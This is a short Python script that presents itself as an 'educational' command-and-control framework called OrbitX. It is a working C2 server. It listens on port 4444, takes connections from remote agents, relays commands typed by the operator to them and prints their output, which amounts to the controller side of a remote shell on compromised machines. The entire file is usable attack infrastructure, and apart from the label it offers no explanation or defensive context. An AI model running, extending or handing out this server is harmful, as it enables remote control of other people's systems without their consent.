#!/usr/bin/env python3
import socket
import threading
import time

# === ORBITX BANNER ===
BANNER = r"""
  OOOOO   RRRRR   BBBB    IIIII   TTTTT   XXXXX 
 OO   OO  RR  RR  BB  BB    III    TTT     XXX  
 OO   OO  RRRRR   BBBBB     III    TTT      X   
 OO   OO  RR  RR  BB  BB    III    TTT     XXX  
  OOOOO   RR  RR  BBBB    IIIII   TTTTT   XXXXX 
                                               
           Project OrbitX v1.0
         Educational C2 Framework
"""

print(BANNER)
print("[*] Starting OrbitX C2 Server...\n")

def handle_client(conn, addr):
    print(f"[+] Session established with {addr[0]}:{addr[1]}")
    try:
        initial = conn.recv(4096).decode('utf-8', errors='ignore').strip()
        print(f"[*] {initial}")
        
        conn.sendall(b"READY\n")
        
        while True:
            command = input("\nOrbitX> ").strip()
            if not command:
                continue
            if command.lower() in ["exit", "quit"]:
                conn.sendall(b"exit\n")
                print("[-] Closing session...")
                break
            
            conn.sendall((command + "\n").encode('utf-8'))
            
            response = ""
            start_time = time.time()
            while True:
                try:
                    chunk = conn.recv(8192).decode('utf-8', errors='ignore')
                    response += chunk
                    if "===END_OF_RESPONSE===" in response or (time.time() - start_time > 10):
                        break
                except:
                    break
            
            clean = response.replace("===END_OF_RESPONSE===", "").strip()
            if clean:
                print(clean)
            else:
                print("[Command executed]")
                
    except Exception as e:
        print(f"[-] Connection lost: {e}")
    finally:
        conn.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(5)
    print("[*] OrbitX C2 Listening on port 4444 | Waiting for agents...\n")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        thread.start()

if __name__ == "__main__":
    start_server()